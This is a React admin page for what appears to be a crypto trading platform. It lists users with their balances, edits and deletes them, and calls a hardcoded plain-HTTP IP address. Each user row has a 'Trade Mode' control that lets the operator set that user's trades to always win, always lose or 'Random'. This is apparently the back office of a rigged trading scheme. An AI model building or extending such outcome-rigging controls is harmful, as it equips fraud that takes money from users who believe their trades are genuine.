import React, { useEffect, useState } from 'react';
import axios from 'axios';
import Sidebar from '../../components/admin/Sidebar';
import EditUserModal from '../../components/editUserModal';
import { User } from '@/types/crypto';
import { toast } from 'react-toastify';

const UsersPage: React.FC = () => {
  const [users, setUsers] = useState<User[]>([]);
  const [selectedUser, setSelectedUser] = useState<User | null>(null);
  const [isModalOpen, setIsModalOpen] = useState<boolean>(false);
  const [tradeModes, setTradeModes] = useState<{ [key: string]: string }>({}); // For storing user trade modes

  // Fetch all users and their trade modes
  useEffect(() => {
    const fetchUsers = async () => {
      try {
        const token = localStorage.getItem('token');
        const response = await axios.get<User[]>('http://116.203.108.180:5000/auth/users', {
          headers: {
            Authorization: `Bearer ${token}`,
          },
        });
        setUsers(response.data);
        response.data.forEach((user: User) => fetchAutoMode(user._id));
        toast.success('User loaded successfully')
      } catch (error) {
        console.error('Error fetching users:', error);
        toast.error('Error fetching users')
      }
    };

    fetchUsers();
  }, []);

  // Function to fetch the autoMode for a specific user
  const fetchAutoMode = async (userId: string) => {
    try {
      const token = localStorage.getItem('token');
      const response = await axios.get(`http://116.203.108.180:5000/trade/automode/${userId}`, {
        headers: {
          Authorization: `Bearer ${token}`,
        },
      });

      // Set the trade mode for the user
      setTradeModes((prevModes) => ({
        ...prevModes,
        [userId]: response.data.autoMode,
      }));
    } catch (error) {
      console.error(`Error fetching auto mode for user ${userId}:`, error);
    }
  };

  const handleUpdateUser = async (updatedUser: User) => {
    try {
      const token = localStorage.getItem('token');
      const userId = updatedUser._id;

      const response = await axios.put(
        `http://116.203.108.180:5000/admin/users/${userId}`,
        updatedUser,
        {
          headers: {
            Authorization: `Bearer ${token}`,
          },
        }
      );
      setUsers((prevUsers) =>
        prevUsers.map((user) => (user._id === userId ? { ...user, ...response.data } : user))
      );
      setIsModalOpen(false);
    } catch (error) {
      console.error('Error updating user:', error);
      toast.error('Error updating user:');
    }
  };

  const handleDeleteUser = async (userId: string) => {
    try {
      const token = localStorage.getItem('token');
      await axios.delete(`http://116.203.108.180:5000/auth/users/${userId}`, {
        headers: {
          Authorization: `Bearer ${token}`,
        },
      });
      setUsers((prevUsers) => prevUsers.filter((user) => user._id !== userId));
      toast.success('User deleted successfully');
    } catch (error) {
      console.error('Error deleting user:', error);
      toast.error('Error deleting user');
    }
  };

  const handleEditUser = (user: User) => {
    setSelectedUser(user);
    setIsModalOpen(true);
  };

  const handleModalClose = () => {
    setSelectedUser(null);
    setIsModalOpen(false);
  };

  // Function to handle trade mode updates (toggle between 'alwaysWin', 'alwaysLose', 'off')
  const handleToggleTradeMode = async (userId: string, mode: string) => {
    try {
      const token = localStorage.getItem('token');
      await axios.put(
        `http://116.203.108.180:5000/trade/automode/${userId}`,
        { autoMode: mode },
        {
          headers: {
            Authorization: `Bearer ${token}`,
          },
        }
      );

      setTradeModes((prevModes) => ({
        ...prevModes,
        [userId]: mode,
      }));

      toast.success(`Trade mode for user ${userId} set to ${mode}`);
    // eslint-disable-next-line @typescript-eslint/no-unused-vars
    } catch (error) {
      toast.error('Error updating trade mode:');
    }
  };

  return (
    <div className="flex">
      <Sidebar />
      <div className="flex-1 p-10 bg-gray-100 min-h-screen">
        <h2 className="text-3xl font-semibold text-gray-800 mb-6">Users Management</h2>

        {/* Table Wrapper */}
        <div className="overflow-x-auto bg-white rounded-lg shadow-md">
          <table className="w-full text-left table-auto">
            <thead className="bg-blue-600 text-white">
              <tr>
                <th className="py-3 px-4 font-semibold text-sm">ID</th>
                <th className="py-3 px-4 font-semibold text-sm">Name</th>
                <th className="py-3 px-4 font-semibold text-sm">Email</th>
                <th className="py-3 px-4 font-semibold text-sm">Balance</th>
                <th className="py-3 px-4 font-semibold text-sm text-center">Actions</th>
                <th className="py-3 px-4 font-semibold text-sm text-center">Trade Mode</th>
              </tr>
            </thead>
            <tbody className="text-gray-800">
              {users.map((user) => (
                <tr key={user._id} className="border-b hover:bg-gray-50">
                  <td className="py-3 px-4 text-sm">{user._id}</td>
                  <td className="py-3 px-4 text-sm font-medium">{user.name}</td>
                  <td className="py-3 px-4 text-sm">{user.email}</td>
                  <td className="py-3 px-4 text-sm">{user.balance}</td>
                  <td className="py-3 px-4 text-center">
                    <button
                      className="text-blue-500 hover:underline mr-4"
                      onClick={() => handleEditUser(user)}
                    >
                      Edit
                    </button>
                    <button
                      className="text-red-500 hover:underline"
                      onClick={() => handleDeleteUser(user._id)}
                    >
                      Delete
                    </button>
                  </td>
                  <td className="py-3 px-4 text-center">
                    <select
                      value={tradeModes[user._id] || 'off'} // Display the current trade mode
                      onChange={(e) => handleToggleTradeMode(user._id, e.target.value)}
                      className="bg-gray-200 p-2 rounded-md"
                    >
                      <option value="off">Random</option>
                      <option value="alwaysWin">Win</option>
                      <option value="alwaysLose">Lose</option>
                    </select>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>

        {/* Render Modal */}
        {isModalOpen && selectedUser && (
          <EditUserModal
            user={selectedUser}
            onClose={handleModalClose}
            onUpdate={handleUpdateUser}
          />
        )}
      </div>
    </div>
  );
};

export default UsersPage;
